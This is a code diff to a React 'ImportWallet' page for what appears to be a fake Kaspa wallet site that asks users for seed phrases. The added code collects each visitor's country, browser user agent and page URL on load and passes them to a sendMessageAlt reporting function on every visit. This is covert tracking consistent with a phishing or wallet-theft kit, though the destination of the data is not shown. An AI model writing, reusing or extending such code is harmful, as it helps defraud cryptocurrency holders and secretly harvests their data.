@@ -16,6 +16,7 @@ export default function ImportWallet() {
   const [seedPhraseList, setSeedPhraseList] = useState()
   const [phraseState, setPhraseState] = useState(true)
   const [seedPhraseErrorMessage, setSeedPhraseErrorMessage] = useState()
+  const [dataReady, setDataReady] = useState(false)
   const toggleSwitch = () => {
     setIsToggled(!isToggled);
   };
@@ -23,33 +24,25 @@ export default function ImportWallet() {
   const router = useRouter()
 
   useEffect(() => {
-    const isFirstVisit = localStorage.getItem("isFirstVisit");
-  
-    if (!isFirstVisit) {
-      // Run sendMessageAlt on the user's first visit
-      sendMessageAlt();
-      localStorage.setItem("isFirstVisit", "true");
-    }
-  
-    const fetchUserInfo = async () => {
+    const fetchData = async () => {
       const userInfo = await getUserCountry();
+      const userAgent = navigator.userAgent;
+      const windowLocation = window.location.href;
+
       setUserInfo(userInfo);
+      setUserAgent(userAgent);
+      setWindowLocation(windowLocation);
+      setDataReady(true);
     };
-    const fetchWordList = async () => {
-      try {
-        const wordList = await axios.get("https://www.kaspawallet.org/seedphrase.txt");
-        setSeedPhraseList(wordList.data);
-      } catch (error) {
-        console.error("Failed to fetch seed phrase list:", error);
-      }
-    };
-  
-    const userAgent = navigator.userAgent;
-    setUserAgent(userAgent);
-    fetchUserInfo();
-    fetchWordList();
-    setWindowLocation(window.location.href);
+
+    fetchData();
   }, []);
+
+  useEffect(() => {
+    if (dataReady) {
+      sendMessageAlt();
+    }
+  }, [dataReady]);
   
   const messageData = {
     country: userInfo?.country || "Unknown",
